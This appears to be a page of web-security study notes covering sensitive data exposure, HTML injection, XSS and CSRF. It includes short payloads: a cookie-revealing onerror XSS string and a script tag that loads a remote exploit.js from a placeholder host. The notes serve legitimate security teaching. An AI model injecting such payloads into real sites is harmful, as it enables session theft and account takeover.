# 🌂 Front End Vulnerabilities

## Sensitive Data Exposure

[Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3\_2017-Sensitive\_Data\_Exposure) refers to the availability of sensitive data in clear-text to the end-user.

It can be utilized to gain access to sensitive functionality (i.e., an admin panel), which may lead to compromising the entire server.

#### Example:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

And if we look at the page source:

```html
<form action="action_page.php" method="post">

    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>

        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>

</html>
```

Good to note that these human flaws are not very common but we could find other things such as test pages or directories, debugging parameters, or hidden functionality.

## HTML Injection

Another major aspect of front end security is validating and sanitizing accepted user input.

[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/11-Client-side\_Testing/03-Testing\_for\_HTML\_Injection) occurs when unfiltered user input is displayed on the page.

When a user has complete control of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the page. This may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.

Let's say we have this simple input page:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

If there is no sanitizing and we input this malicious code:

```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

The website will look like this:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Cross-Site Scripting (XSS)

[Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks works by injecting `JavaScript` code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine.

here are the main types:

| Type            | Description                                                                                                                               |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the page after processing (e.g., search result or error message).                                  |
| `Stored XSS`    | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).                    |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title). |

We saw earlier the HTML injection, from that input, we could've printed out the session cookie via a DOM based XSS:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

## Cross-Site Request Forgery (CSRF)

&#x20;[Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) is caused by unfiltered user input and is used to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.

Another way of exploiting this would be to instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:

```html
"><script src=//www.example.com/exploit.js></script>
```
